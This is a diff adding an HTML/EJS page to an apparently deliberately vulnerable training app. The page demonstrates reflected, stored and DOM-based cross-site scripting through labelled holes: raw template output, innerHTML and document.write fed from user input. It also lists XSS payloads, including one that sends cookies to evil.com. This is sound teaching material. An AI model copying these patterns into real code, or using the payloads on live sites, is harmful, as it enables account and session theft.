@@ -1,0 +1,118 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>XSS — VulnApp</title>
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+<body>
+  <%- include('partials/navbar') %>
+  <div class="container">
+    <div class="page-header">
+      <h1>📜 Cross-Site Scripting (XSS)</h1>
+      <p>Vulnerabilities: Reflected XSS, Stored XSS, DOM-based XSS</p>
+    </div>
+
+    <!-- Reflected XSS -->
+    <div class="form-card">
+      <h2>1. Reflected XSS (via GET parameter)</h2>
+      <form method="GET" action="/xss">
+        <div class="form-group">
+          <label for="name">Your Name</label>
+          <input type="text" id="name" name="name" value="<%= name %>" placeholder='<script>alert("XSS")</script>'>
+        </div>
+        <button type="submit" class="btn btn-primary">Greet Me</button>
+      </form>
+
+      <% if (name) { %>
+        <div class="result-box">
+          <!-- VULN: Reflected XSS — unescaped user input rendered with <%- (raw) -->
+          <h3>Hello, <%- name %>!</h3>
+        </div>
+      <% } %>
+
+      <div class="hint-box">
+        <h4>💡 Payloads</h4>
+        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code><br>
+        <code>&lt;img src=x onerror=alert('XSS')&gt;</code><br>
+        <code>&lt;svg onload=alert('XSS')&gt;</code>
+      </div>
+    </div>
+
+    <!-- Stored XSS -->
+    <div class="form-card">
+      <h2>2. Stored XSS (Comments)</h2>
+      <form method="POST" action="/xss/comment">
+        <input type="hidden" name="post_id" value="1">
+        <div class="form-group">
+          <label for="comment-username">Username</label>
+          <input type="text" id="comment-username" name="username" placeholder='<img src=x onerror=alert("XSS")>'>
+        </div>
+        <div class="form-group">
+          <label for="comment-text">Comment</label>
+          <textarea id="comment-text" name="comment" rows="3" placeholder='<script>document.location="http://evil.com?c="+document.cookie</script>'></textarea>
+        </div>
+        <button type="submit" class="btn btn-primary">Post Comment</button>
+      </form>
+
+      <% if (comments && comments.length > 0) { %>
+        <h3>Comments:</h3>
+        <div class="comments-list">
+          <% comments.forEach(c => { %>
+            <div class="comment">
+              <!-- VULN: Stored XSS — unescaped rendering of stored user input -->
+              <strong><%- c.username %></strong>
+              <p><%- c.comment %></p>
+            </div>
+          <% }) %>
+        </div>
+      <% } %>
+    </div>
+
+    <!-- DOM XSS -->
+    <div class="form-card">
+      <h2>3. DOM-based XSS</h2>
+      <div class="form-group">
+        <label for="dom-input">Enter HTML (rendered directly in DOM):</label>
+        <input type="text" id="dom-input" placeholder='<img src=x onerror=alert("DOM XSS")>'>
+        <button class="btn btn-primary" onclick="renderDom()">Render</button>
+      </div>
+      <!-- VULN: DOM XSS — innerHTML used to render user input -->
+      <div id="dom-output" class="result-box"></div>
+
+      <!-- VULN: DOM XSS via document.write -->
+      <script>
+        function renderDom() {
+          var input = document.getElementById('dom-input').value;
+          // VULN: innerHTML injection
+          document.getElementById('dom-output').innerHTML = input;
+        }
+
+        // VULN: DOM XSS via URL fragment
+        var hash = window.location.hash.substring(1);
+        if (hash) {
+          document.getElementById('dom-output').innerHTML = decodeURIComponent(hash);
+        }
+
+        // VULN: document.write with user input
+        var urlParams = new URLSearchParams(window.location.search);
+        var msg = urlParams.get('msg');
+        if (msg) {
+          document.write('<div class="alert">' + msg + '</div>');
+        }
+      </script>
+    </div>
+
+    <!-- Search Reflected -->
+    <% if (searchResult) { %>
+      <div class="form-card">
+        <h2>Search Results for:</h2>
+        <!-- VULN: Reflected XSS in search results -->
+        <p><%- searchResult %></p>
+      </div>
+    <% } %>
+  </div>
+  <%- include('partials/footer') %>
+</body>
+</html>
